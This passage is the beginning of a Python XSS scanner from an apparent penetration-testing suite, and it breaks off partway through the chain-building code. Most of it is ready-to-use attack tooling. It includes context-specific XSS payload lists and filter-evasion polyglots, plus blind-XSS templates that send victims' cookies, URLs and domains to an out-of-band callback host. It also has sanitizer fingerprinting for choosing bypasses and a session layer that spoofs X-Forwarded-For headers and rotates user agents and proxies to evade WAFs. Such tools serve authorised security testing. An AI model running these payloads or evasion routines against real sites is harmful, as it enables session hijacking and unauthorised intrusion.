#!/usr/bin/env python3
r"""
auditing_tools/xss_finder.py — Cross-Site Scripting Auditor (v5.0)
═══════════════════════════════════════════════════════════════════════════════

Military-grade XSS detection with WAF evasion, sanitizer fingerprinting,
CSP-aware payload selection, chains, and confirmed-only output.

SAFETY MODEL
────────────
Every target request flows through `EvasionSession`:
  • Jittered pacing
  • User-Agent + X-Forwarded-For rotation
  • Optional proxy rotation
  • Exponential back-off on 403/406/429/503
  • 60-second cool-down after a WAF block page

CONFIRMATION MODEL
──────────────────
  REFLECTED — payload appears byte-identical in response AND survives with
              executable punctuation intact (()"`<>), AND reflection is
              consistent across 2 probes (multi-fidelity).

  STORED    — marker submitted via injection surface reappears on revisit
              URL in an executable context.

  BLIND     — Huginn OOB callback confirmed (upgraded to CRITICAL).

  DOM       — source→sink dataflow detected with proximity+indent heuristic.

  JSONP     — callback parameter reflected unquoted at start of response.

  HEADER    — injected header reflected unencoded in a JS-executable context.

  CSP       — reported as finding but never drives a CRITICAL classification
              by itself; it amplifies severity of other findings.

SEVERITY (impact-driven)
────────────────────────
  CRITICAL   Blind confirmed via OOB, stored XSS in executable context,
             reflected with intact punctuation, DOM with confirmed jQuery
             CVE chain, or confirmed XSS against known-insecure CSP.
  HIGH       Reflected with partial punctuation, JSONP injection confirmed,
             header reflection in executable context, DOM source-sink with
             high confidence (≥75).
  MEDIUM     Reflection with encoded punctuation, DOM source-sink low
             confidence, CSP allows 'unsafe-inline' or wildcard, missing
             base-uri / object-src.
  LOW        Marker reflection only (payload was filtered).
  INFO       CSP report-only header, information-disclosure notes.

CHAINS
──────
  xss-reflected         confirmed reflected XSS
  xss-stored            confirmed stored XSS
  xss-blind             confirmed blind XSS via OOB
  xss-dom               DOM XSS surface with confirmed source→sink
  xss-waf-bypass        WAF initially blocked but variant succeeded
  xss-jsonp             JSONP callback injection
  xss-csp-bypass        confirmed XSS against CSP that can be bypassed
  xss-csp-missing       no CSP — MITM amplification
  xss-cookie-theft      XSS + session cookie missing HttpOnly
  xss-waf-protected     WAF actively blocks XSS payloads

OUTPUTS
───────
  xss_findings.json       every finding
  xss_confirmed.json      HIGH / CRITICAL only
  xss_chains.json         structured chain records
  xss_evidence/           raw baseline + reflected bodies per confirmed finding
  xss_candidates.txt      flat triage
  xss_confirmed.txt       confirmed flat triage
  xss_dom.txt             DOM-specific
  xss_blind.txt           blind payloads (for manual deployment + OOB verify)
  xss_csp.txt             CSP-specific
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import secrets
import statistics
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.xss_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    return getattr(CFG, key, default) if CFG_LOADED else default


def _xss_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("xss", {}) or {}
    return {
        "rate_limit":   entry.get("rate_limit", 3),
        "concurrency":  entry.get("concurrency", 3),
        "timeout":      entry.get("timeout", 12),
        "max_surfaces": entry.get("max_surfaces", 400),
        "test_stored":  entry.get("test_stored", True),
        "test_dom":     entry.get("test_dom", True),
        "test_headers": entry.get("test_headers", False),
        "verify_tls":   entry.get("verify_tls", _cfg("VERIFY_TLS", False)),
        "jitter":       entry.get("jitter", 0.4),
        "proxies":      entry.get("proxies", []),
    }


def _oob_settings() -> dict:
    mode = (_cfg("OAST_MODE", "huginn") or "huginn").lower()
    domain = (_cfg("OAST_DOMAIN", "") or "").strip()
    base_url = (_cfg("OAST_BASE_URL", "") or "").strip()
    read_key = _cfg("OAST_KEY", "") or _cfg("HUGINN_READ_KEY", "") or ""
    if mode == "disabled" or not domain:
        return {"mode": "disabled", "base_url": "", "read_key": "", "domain": ""}
    if base_url:
        if not base_url.startswith(("http://", "https://")):
            base_url = "https://" + base_url
    elif domain:
        base_url = "https://" + domain
    return {"mode": mode, "domain": domain,
            "base_url": base_url.rstrip("/"), "read_key": read_key}


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def rank(self) -> int:
        return {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]


# ═════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION
# ═════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: dict[str, dict] = {
    "Cloudflare":  {"headers": ["cf-ray", "__cf_bm", "cf-cache-status"],
                    "body": ["Attention Required! | Cloudflare", "cloudflare-nginx"]},
    "Akamai":      {"headers": ["akamai-grn", "x-akamai-transformed", "_abck"],
                    "body": ["Access Denied", "Reference&#32;&#35;"]},
    "Imperva":     {"headers": ["x-iinfo", "incap_ses", "_Incapsula_Resource"],
                    "body": ["Pardon Our Interruption", "Incapsula incident ID"]},
    "AWS WAF":     {"headers": ["x-amzn-requestid", "x-amzn-errortype", "awselb"],
                    "body": ["Request blocked", "AWS WAF"]},
    "F5 BIG-IP":   {"headers": ["x-wa-info", "bigipserver"],
                    "body": ["The requested URL was rejected", "F5 Networks"]},
    "Sucuri":      {"headers": ["x-sucuri-id", "x-sucuri-cache"],
                    "body": ["Sucuri WebSite Firewall", "Access Denied - Sucuri"]},
    "DataDome":    {"headers": ["x-datadome", "datadome"],
                    "body": ["datadome", "captcha-delivery"]},
    "ModSecurity": {"headers": ["x-mod-security"],
                    "body": ["ModSecurity", "Not Acceptable!"]},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]


@dataclass
class WAFReport:
    vendor: str = "unknown"
    confidence: int = 0
    signals: list[str] = field(default_factory=list)
    blocked: bool = False


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

FINDING_SCHEMA_VERSION = 3       # v5.0: severity enum, chains, evidence

DEFAULT_TIMEOUT        = 12
BASELINE_SAMPLES       = 2
REQUEST_SLEEP          = 0.08
MAX_URLS               = 5000
MAX_CONTEXT_PAYLOADS   = 6
MAX_CONTEXT_PAYLOADS_AGGRESSIVE = 12
MAX_DOM_FILES          = 40
MAX_STORED_PAGES       = 15
MAX_RESPONSE_BYTES     = 2_000_000
MARKER_PREFIX          = "argusxss"
MULTI_FIDELITY_ATTEMPTS = 2      # fire payload N times to confirm reflection

HUGINN_TOKEN_BYTES     = 16
HUGINN_POLL_INTERVAL   = 8
HUGINN_POLL_TIMEOUT    = 120

NON_EXECUTABLE_CONTENT_PREFIXES = (
    "image/png", "image/jpeg", "image/gif", "image/webp",
    "image/bmp", "image/x-icon", "image/vnd.microsoft.icon",
    "audio/", "video/", "font/", "application/font",
    "application/octet-stream", "application/pdf",
    "application/zip", "application/x-tar", "application/gzip",
)

JSON_CONTENT_PREFIXES = (
    "application/json", "text/json",
    "application/problem+json", "application/vnd.api+json",
)

SVG_CONTENT_PREFIXES  = ("image/svg+xml",)
XML_CONTENT_PREFIXES  = ("text/xml", "application/xml", "application/xhtml+xml")
MARKDOWN_CONTENT_PREFIXES = ("text/markdown", "text/x-markdown")

HEADER_INJECTION_VECTORS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
    "X-Forwarded-Host", "X-Client-IP", "Origin",
]

WAF_BLOCK_STATUSES = (403, 406, 429, 501)

JSONP_PARAM_HINTS = ("callback", "jsonp", "cb", "json_callback", "cbname", "jsoncb")

JQUERY_MIN_SAFE = (3, 5, 0)
DOMPURIFY_MIN_SAFE = (2, 3, 3)

# Sanitizer fingerprinting — pick bypass strategy based on what's actually running
SANITIZER_SIGNATURES = {
    "DOMPurify":       [r"DOMPurify", r"purify\.isSupported", r"DOMPurify\.sanitize"],
    "sanitize-html":   [r"sanitize-html", r"sanitizeHtml\("],
    "Bleach":          [r"\bbleach\b", r"bleach\.clean"],
    "OWASP Sanitizer": [r"owasp.*sanitizer", r"PolicyFactory"],
    "Angular":         [r"angular.*sanitize", r"AngularSanitizer", r"sanitizeHtml"],
    "XSS-Filter PHP":  [r"XSS_Filter", r"xss_clean"],
    "AntiSamy":        [r"AntiSamy", r"antisamy"],
    "js-xss":          [r"filterXSS", r"js-xss"],
}

DENIAL_MARKERS = (
    "blocked", "forbidden", "not allowed", "invalid input",
    "input rejected", "malicious", "waf", "sanitized",
    "not permitted", "request denied",
)

ENCODING_CHARS = ["<", ">", '"', "'", "`", "(", ")"]

ENCODED_FORMS_BY_TYPE = {
    "entity_named":   {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&apos;"},
    "entity_decimal": {"<": "&#60;", ">": "&#62;", '"': "&#34;", "'": "&#39;",
                       "`": "&#96;", "(": "&#40;", ")": "&#41;"},
    "entity_hex":     {"<": "&#x3c;", ">": "&#x3e;", '"': "&#x22;",
                       "'": "&#x27;", "`": "&#x60;", "(": "&#x28;", ")": "&#x29;"},
    "url_encoded":    {"<": "%3c", ">": "%3e", '"': "%22", "'": "%27",
                       "`": "%60", "(": "%28", ")": "%29"},
    "js_escape":      {'"': '\\"', "'": "\\'", "`": "\\`"},
    "unicode_escape": {"<": "\\u003c", ">": "\\u003e", "(": "\\u0028",
                       ")": "\\u0029"},
}

ENCODED_FORMS = {ch: [] for ch in ENCODING_CHARS}
for _forms in ENCODED_FORMS_BY_TYPE.values():
    for _ch, _form in _forms.items():
        ENCODED_FORMS.setdefault(_ch, []).append(_form)

CSP_BYPASS_HOSTS = [
    "ajax.googleapis.com", "cdnjs.cloudflare.com", "cdn.jsdelivr.net",
    "unpkg.com", "code.jquery.com", "maxcdn.bootstrapcdn.com",
    "stackpath.bootstrapcdn.com", "www.google.com", "accounts.google.com",
]

STORED_REVISIT_PATTERNS = [
    "/", "/profile", "/account", "/dashboard", "/settings",
    "/comments", "/messages", "/posts", "/feed", "/notifications",
    "/admin", "/admin/users", "/support", "/tickets",
]

CONTEXT_PAYLOADS: dict[str, list[str]] = {
    "html_body": [
        "<svg onload=alert('{m}')>",
        "<img src=x onerror=alert('{m}')>",
        "<script>alert('{m}')</script>",
        "<details open ontoggle=alert('{m}')>",
        "<iframe srcdoc=\"<script>alert('{m}')</script>\">",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x></textarea><img src=x onerror=alert('{m}')>",
    ],
    "attr_double": [
        "\"><svg onload=alert('{m}')>",
        "\" onmouseover=\"alert('{m}')\" x=\"",
        "\" autofocus onfocus=\"alert('{m}')\" x=\"",
        "\"><img src=x onerror=alert('{m}')>",
        "\" onanimationstart=\"alert('{m}')\" style=\"animation:x\" x=\"",
        "\" onpointerover=\"alert('{m}')\" x=\"",
    ],
    "attr_single": [
        "'><svg onload=alert('{m}')>",
        "' onmouseover='alert(\"{m}\")' x='",
        "' autofocus onfocus='alert(\"{m}\")' x='",
        "'><img src=x onerror=alert('{m}')>",
    ],
    "attr_unquoted": [
        " onmouseover=alert('{m}') x=",
        " autofocus onfocus=alert('{m}') x=",
        " onanimationstart=alert('{m}') style=animation:x x=",
        "><svg onload=alert('{m}')>",
    ],
    "event_handler": [
        "alert('{m}')",
        "';alert('{m}')//",
        "\";alert('{m}')//",
        "alert('{m}')//",
    ],
    "script_string_double": [
        "\";alert('{m}')//",
        "\\\";alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_string_single": [
        "';alert('{m}')//",
        "\\';alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_template": [
        "${alert('{m}')}",
        "`;alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_bare": [
        "alert('{m}')",
        ";alert('{m}')//",
        "*/alert('{m}')/*",
    ],
    "url_attr": [
        "javascript:alert('{m}')",
        "javascript:alert('{m}')//",
        "data:text/html,<script>alert('{m}')</script>",
        "&#106;avascript:alert('{m}')",
    ],
    "css": [
        "</style><svg onload=alert('{m}')>",
        "}</style><svg onload=alert('{m}')>",
    ],
    "html_comment": [
        "--><svg onload=alert('{m}')>",
        "--!><svg onload=alert('{m}')>",
        "--><img src=x onerror=alert('{m}')>",
    ],
    "textarea": [
        "</textarea><svg onload=alert('{m}')>",
        "</textarea><img src=x onerror=alert('{m}')>",
    ],
    "title": [
        "</title><svg onload=alert('{m}')>",
        "</title><img src=x onerror=alert('{m}')>",
    ],
    "svg": [
        "<script>alert('{m}')</script>",
        "<svg xmlns='http://www.w3.org/2000/svg' onload=alert('{m}')>",
        "<foreignObject><script>alert('{m}')</script></foreignObject>",
    ],
    "xml": [
        "<script>alert('{m}')</script>",
        "<![CDATA[<script>alert('{m}')</script>]]>",
    ],
    "unknown": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{m}'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{m}')//>\\x3e",
        "<svg onload=alert('{m}')>",
    ],
}

DOM_SOURCES = [
    "location.hash", "location.search", "location.href", "location.pathname",
    "document.URL", "document.documentURI", "document.referrer",
    "document.cookie", "window.name", "window.location",
    "document.baseURI", "history.state", "event.data",
    "localStorage", "sessionStorage", "IndexedDB",
    "postMessage", "WebSocket", "EventSource", "Worker",
    "URLSearchParams", "URL", "document.domain",
    "navigator.userAgent", "navigator.language", "screen.name",
]

DOM_SINKS = [
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "document.write", "document.writeln",
    "eval", "Function", "setTimeout", "setInterval",
    "location.href", "location.assign", "location.replace",
    "window.open", "element.setAttribute",
    "jQuery.html", "jQuery.append", "jQuery.prepend", "jQuery.after",
    "jQuery.before", "$.globalEval", "$.getScript",
    "v-html", "dangerouslySetInnerHTML", "ng-bind-html",
    "createContextualFragment", "Range.createContextualFragment",
    "execScript", "setImmediate", "insertRow",
    "src", "srcdoc", "href",
]

_BLIND_FETCH = (
    "<script>(function(){{"
    "var d={{u:location.href.slice(0,500),c:document.cookie.slice(0,2000),"
    "d:document.domain,r:document.referrer.slice(0,500),"
    "ls:(function(){{try{{return localStorage.length}}catch(e){{return 0}}}})(),"
    "ss:(function(){{try{{return sessionStorage.length}}catch(e){{return 0}}}})(),"
    "ua:navigator.userAgent.slice(0,200)}};"
    "fetch('{oob}',{{method:'POST',mode:'no-cors',"
    "headers:{{'Content-Type':'application/json'}},"
    "body:JSON.stringify(d)}}).catch(function(){{}})"
    "}})();</script>"
)
_BLIND_IMAGE = (
    "<script>(new Image()).src='{oob}?c='"
    "+encodeURIComponent(document.cookie.slice(0,1500))"
    "+'&u='+encodeURIComponent(location.href.slice(0,1500))"
    "+'&d='+encodeURIComponent(document.domain)"
    "</script>"
)
_BLIND_SVG = (
    "<svg onload=\"fetch('{oob}?c='+encodeURIComponent(document.cookie)"
    "+'&u='+encodeURIComponent(location.href))\">"
)
_BLIND_IMG_ATTR = (
    "<img src='{oob}?c=x' "
    "onerror=\"this.src='{oob}?c='+encodeURIComponent(document.cookie)"
    "+'&u='+encodeURIComponent(location.href)\">"
)
_BLIND_SCRIPT_SRC = "<script src='{oob}'></script>"

BLIND_PAYLOAD_TEMPLATES = [
    ("fetch_post",  _BLIND_FETCH),
    ("image",       _BLIND_IMAGE),
    ("svg_onload",  _BLIND_SVG),
    ("img_attr",    _BLIND_IMG_ATTR),
    ("script_src",  _BLIND_SCRIPT_SRC),
]


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    location: str = "query"
    status: int = 0
    length: int = 0
    body: str = ""
    content_type: str = ""
    median_time: float = 0.0
    waf: str = ""
    nosniff: bool = False
    sanitizer: str = ""
    sanitizer_version: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "location": self.location,
            "status": self.status, "length": self.length,
            "median_time": round(self.median_time, 3),
            "content_type": self.content_type,
            "waf": self.waf,
            "nosniff": self.nosniff,
            "sanitizer": self.sanitizer,
            "sanitizer_version": self.sanitizer_version,
        }


@dataclass
class XSSFinding:
    target: str
    param: str
    xss_type: str
    context: str = ""
    severity: Severity = Severity.MEDIUM
    confidence: int = 50
    confirmed: bool = False
    payload: str = ""
    marker: str = ""
    evidence: str = ""
    bypass_used: str = ""
    encoded_chars: list[str] = field(default_factory=list)
    survived_chars: list[str] = field(default_factory=list)
    param_location: str = "query"
    http_status: int = 0
    chain_ids: list[str] = field(default_factory=list)
    waf_vendor: str = ""
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        raw = (f"{self.target}|{self.param}|{self.param_location}|"
               f"{self.xss_type}|{self.context}")
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "schema_version": FINDING_SCHEMA_VERSION,
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "xss_type":       self.xss_type,
            "context":        self.context,
            "severity":       self.severity.value,
            "confidence":     self.confidence,
            "confirmed":      self.confirmed,
            "payload":        (self.payload or "")[:2048],
            "marker":         self.marker,
            "evidence":       (self.evidence or "")[:1024],
            "bypass_used":    self.bypass_used,
            "encoded_chars":  self.encoded_chars,
            "survived_chars": self.survived_chars,
            "http_status":    self.http_status,
            "chain_ids":      self.chain_ids,
            "waf_vendor":     self.waf_vendor,
            "details":        self.details,
            "auth_enabled":   self.auth_enabled,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


@dataclass
class XSSChain:
    chain_id: str
    name: str
    severity: Severity
    steps: list[str]
    finding_hashes: list[str] = field(default_factory=list)
    evidence: str = ""

    def to_dict(self) -> dict:
        return {
            "chain_id":       self.chain_id,
            "name":           self.name,
            "severity":       self.severity.value,
            "steps":          self.steps,
            "finding_hashes": self.finding_hashes,
            "evidence":       self.evidence[:600],
        }


# ═════════════════════════════════════════════════════════════════════════════
#  RATE LIMITER (adaptive, thread-safe)
# ═════════════════════════════════════════════════════════════════════════════

class SharedRateLimiter:
    def __init__(self, rate_limit: float, jitter: float = 0.0, backoff_max: float = 30.0):
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self.jitter = max(0.0, jitter)
        self._last = 0.0
        self._lock = threading.Lock()
        self._backoff_until = 0.0
        self._backoff_max = backoff_max
        self._consecutive_blocks = 0
        self._block_lock = threading.Lock()

    def wait(self) -> None:
        if self.min_interval <= 0 and self.jitter <= 0:
            return
        with self._lock:
            while True:
                interval = self.min_interval + random.uniform(0, self.jitter)
                now = time.monotonic()
                wait_until = max(self._last + interval, self._backoff_until)
                if now >= wait_until:
                    break
                time.sleep(wait_until - now)
            self._last = time.monotonic()

    def note_response(self, status: int) -> None:
        with self._block_lock:
            if status in (429, 503):
                self._consecutive_blocks += 1
                backoff = min(self._backoff_max,
                              (2 ** min(self._consecutive_blocks, 6)) * 0.25)
                self._backoff_until = time.monotonic() + backoff
                log.debug(f"rate-limiter: backoff {backoff:.2f}s after {status}")
            elif 200 <= status < 400:
                if self._consecutive_blocks:
                    log.debug("rate-limiter: backoff reset")
                self._consecutive_blocks = 0


# ═════════════════════════════════════════════════════════════════════════════
#  EVASION SESSION
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class EvasionProfile:
    rate_limit: float = 3.0
    jitter: float = 0.4
    rotate_ua: bool = True
    rotate_xff: bool = True
    proxies: list[str] = field(default_factory=list)
    backoff_codes: tuple[int, ...] = (403, 406, 429, 503)
    max_backoff: float = 30.0
    cooldown_after_block: float = 60.0


class EvasionSession:
    def __init__(
        self, profile: EvasionProfile, headers: dict, timeout: int,
        *, verify_tls: bool = False, max_bytes: int = MAX_RESPONSE_BYTES,
    ):
        self.profile = profile
        self.timeout = timeout
        self.max_bytes = max_bytes
        self.session = requests.Session()
        self.session.verify = verify_tls
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault("User-Agent", "Argus-XSS-Auditor/5.0")
        self.session.headers.setdefault(
            "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        )
        if not verify_tls:
            log.warning("TLS verification disabled (verify_tls=False) — engagement-only")

        self._min_interval = 1.0 / profile.rate_limit if profile.rate_limit > 0 else 0.0
        self._last = 0.0
        self._backoff = 0.0
        self._cooldown_until = 0.0
        self._proxy_idx = 0
        self._ua_idx = 0
        self._xff_counter = 0
        self._lock = threading.Lock()

    def __enter__(self): return self
    def __exit__(self, *exc):
        try: self.session.close()
        except Exception: pass

    def _pace(self):
        now = time.monotonic()
        if now < self._cooldown_until:
            time.sleep(self._cooldown_until - now)
        interval = self._min_interval + random.uniform(0, self.profile.jitter)
        elapsed = time.monotonic() - self._last
        if elapsed < interval:
            time.sleep(interval - elapsed)
        if self._backoff > 0:
            time.sleep(self._backoff)
        self._last = time.monotonic()

    def _rotate(self):
        with self._lock:
            if self.profile.rotate_ua:
                self.session.headers["User-Agent"] = USER_AGENTS[
                    self._ua_idx % len(USER_AGENTS)
                ]
                self._ua_idx += 1
            if self.profile.rotate_xff:
                self._xff_counter += 1
                o = self._xff_counter % 254 + 1
                self.session.headers["X-Forwarded-For"] = f"10.0.{o}.{o}"
                self.session.headers["X-Real-IP"] = f"10.0.{o}.{o}"

    def _proxy(self) -> Optional[dict]:
        if not self.profile.proxies:
            return None
        with self._lock:
            p = self.profile.proxies[self._proxy_idx % len(self.profile.proxies)]
            self._proxy_idx += 1
        return {"http": p, "https": p}

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._pace()
        self._rotate()
        proxy = self._proxy()
        try:
            resp = self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                stream=True, proxies=proxy, **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {_redact_url(url)}: {e}")
            return None

        try:
            resp._content = resp.raw.read(self.max_bytes, decode_content=True)
        except Exception:
            resp._content = b""

        if resp.status_code in self.profile.backoff_codes:
            self._backoff = min(self.profile.max_backoff,
                                max(1.0, self._backoff * 2 or 1.0))
            low = (resp.text or "")[:2000].lower()
            if any(w in low for w in ("blocked", "firewall", "captcha", "denied")):
                self._cooldown_until = time.monotonic() + self.profile.cooldown_after_block
                log.warning("  WAF block — cooling down %.0fs",
                            self.profile.cooldown_after_block)
        elif resp.status_code < 400:
            self._backoff = 0.0
        return resp

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)

    def benign_get(self, url: str) -> Optional[requests.Response]:
        try:
            return self.session.get(url, timeout=self.timeout, verify=False)
        except requests.RequestException:
            return None


def detect_waf(session: EvasionSession, url: str) -> WAFReport:
    report = WAFReport()
    try:
        resp = session.benign_get(url)
    except Exception:
        return report
    if resp is None:
        return report
    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = _body(resp)[:4000].lower()
    for vendor, sig in WAF_SIGNATURES.items():
        hits = [f"header:{h}" for h in sig["headers"] if h.lower() in header_blob]
        hits += [f"body:{b[:40]}" for b in sig["body"] if b.lower() in body_blob]
        if hits:
            report.vendor = vendor
            report.signals = hits
            report.confidence = min(100, 50 + 15 * len(hits))
            break
    if resp.status_code in WAF_BLOCK_STATUSES:
        low = (resp.text or "")[:2000].lower()
        if any(w in low for w in ("blocked", "denied", "firewall", "captcha")):
            report.blocked = True
            if report.vendor == "unknown":
                report.vendor = "generic-waf"
                report.confidence = 40
    return report


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

_SECRET_PARAM_RE = re.compile(
    r"(?i)(cookie|authorization|token|api[_-]?key|secret|password|session|bearer)"
)


def _redact_url(url: str, max_len: int = 240) -> str:
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return url[:max_len]
        pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        redacted = [(k, "***" if _SECRET_PARAM_RE.search(k) else v) for k, v in pairs]
        clean = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(redacted, safe=""))
        )
        return clean[:max_len]
    except Exception:
        return url[:max_len]


def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls, seen = [], set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(
            query=urllib.parse.urlencode(new, safe=":/?=%{}<>*#$@'\"`()[],!")
        )
    )


def _body(resp: Optional[requests.Response], limit: int = MAX_RESPONSE_BYTES) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _new_marker() -> str:
    return MARKER_PREFIX + "".join(
        random.choices(string.ascii_lowercase + string.digits, k=10)
    )


def _new_huginn_token() -> str:
    return secrets.token_hex(HUGINN_TOKEN_BYTES)


def _looks_denied(resp: Optional[requests.Response]) -> bool:
    # v5 fix: network error is NOT a denial (was True in v4 — losing findings)
    if resp is None:
        return False
    body_low = _body(resp).lower()[:2000]
    return any(m in body_low for m in DENIAL_MARKERS)


def _content_type_kind(ct: str) -> str:
    ct = (ct or "").split(";")[0].strip().lower()
    if not ct:
        return "unknown"
    for p in NON_EXECUTABLE_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "binary"
    for p in JSON_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "json"
    for p in SVG_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "svg"
    for p in XML_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "xml"
    for p in MARKDOWN_CONTENT_PREFIXES:
        if ct.startswith(p):
            return "markdown"
    return "html"


def _is_executable_content_type(ct: str) -> bool:
    return _content_type_kind(ct) != "binary"


def _probe(
    session: EvasionSession, surface: dict, payload: str,
    extra_headers: Optional[dict] = None,
) -> Optional[requests.Response]:
    headers = extra_headers or None
    if surface["location"] == "query":
        return session.get(
            _inject_query(surface["url"], surface["param"], payload),
            **({"headers": headers} if headers else {}),
        )
    if surface["location"] == "body":
        return session.request(
            surface.get("method", "POST"), surface["url"],
            data={surface["param"]: payload},
            **({"headers": headers} if headers else {}),
        )
    return None


def _fingerprint_sanitizer(body: str, headers: dict) -> tuple[str, str]:
    """Detect which sanitizer / templating framework is running."""
    blob = body[:20000]
    hdr_blob = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
    for sanitizer, sigs in SANITIZER_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, blob, re.I):
                version = ""
                m = re.search(rf"{sanitizer}[\s/._-]*v?(\d+\.\d+(?:\.\d+)?)",
                              blob, re.I)
                if m:
                    version = m.group(1)
                return sanitizer, version
    if "x-xss-protection" in hdr_blob:
        return "X-XSS-Protection", ""
    return "", ""


# ═════════════════════════════════════════════════════════════════════════════
#  CHAINS
# ═════════════════════════════════════════════════════════════════════════════

def _chain_ids_for(f: XSSFinding) -> list[str]:
    ids: list[str] = []
    if not f.confirmed and f.severity.rank < Severity.HIGH.rank:
        return ids
    if f.xss_type == "reflected":
        ids.append("xss-reflected")
    elif f.xss_type == "stored":
        ids.append("xss-stored")
    elif f.xss_type == "blind":
        ids.append("xss-blind")
    elif f.xss_type == "dom":
        ids.append("xss-dom")
    elif f.xss_type == "jsonp":
        ids.append("xss-jsonp")
    elif f.xss_type == "header":
        ids.append("xss-reflected")
    elif f.xss_type == "csp":
        if "unsafe-inline" in f.payload or "wildcard" in f.evidence.lower():
            ids.append("xss-csp-bypass")
        if "report-only" in f.evidence.lower() or "missing" in f.evidence.lower():
            ids.append("xss-csp-missing")
    if f.bypass_used and f.bypass_used not in ("", "none"):
        ids.append("xss-waf-bypass")
    return ids


def build_chains(findings: list[XSSFinding]) -> list[XSSChain]:
    chains: dict[str, list[XSSFinding]] = {}
    NAMES = {
        "xss-reflected":      "Reflected XSS confirmed",
        "xss-stored":         "Stored XSS confirmed",
        "xss-blind":          "Blind XSS confirmed via OOB callback",
        "xss-dom":            "DOM XSS source→sink confirmed",
        "xss-waf-bypass":     "WAF bypassed with variant payload",
